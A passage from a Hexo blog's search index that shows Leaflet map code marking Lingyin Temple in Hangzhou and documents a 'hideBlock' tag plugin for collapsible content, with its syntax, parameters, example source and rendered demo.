normalm3=L.tileLayer.chinaProvider('Geoq.Normal.Gray',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm4=L.tileLayer.chinaProvider('Geoq.Normal.Warm',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm5=L.tileLayer.chinaProvider('Geoq.Theme.Hydro',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normal=L.layerGroup([normalm1,normalm2,normalm3,normalm4,normalm5]);var baseLayers={"智图地图":normalm1,"午夜蓝":normalm2,"灰色":normalm3,"暖色":normalm4,"水系":normalm5};var mymap=L.map("geoqMap-120.101101-30.239119",{center:[30.239119,120.101101],zoom:13,layers:[normalm3],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);var marker = L.marker(['30.239119','120.101101']).addTo(mymap);marker.bindPopup("这里是西湖灵隐寺，据说求姻缘很灵验哦！").openPopup();</script><br><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-31-隐藏块">2.31 隐藏块</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% hideBlock display,bg,color %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endhideBlock %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>content：要隐藏的内容</li><li>display：展示前按钮显示的文字（可选）</li><li>bg：按钮的背景颜色（可选）</li><li>color：按钮显示的文字的颜色（可选）</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% hideBlock 点我预览, blue %&#125;</span><br><span class="line">这里有张图片：</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://s1.vika.cn/space/2022/10/30/b35fce448bc9404a8d65c3ce1e6e46eb&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;image (1)&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:67%;&quot;</span> /&gt;</span></span></span><br><span class="line">&#123;% endhideBlock %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="hide-block"><button type="button" class="hide-button" style="background-color:  blue;">点我预览    </button><div class="hide-content"><p>这里有张图片：<br><img src="https://s1.vika.cn/space/2022/10/30/b35fce448bc9404a8d65c3ce1e6e46eb" alt="image (1)" style="zoom:67%;" /></p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      <categories>
          
          <category> 演示 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> 外挂标签 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
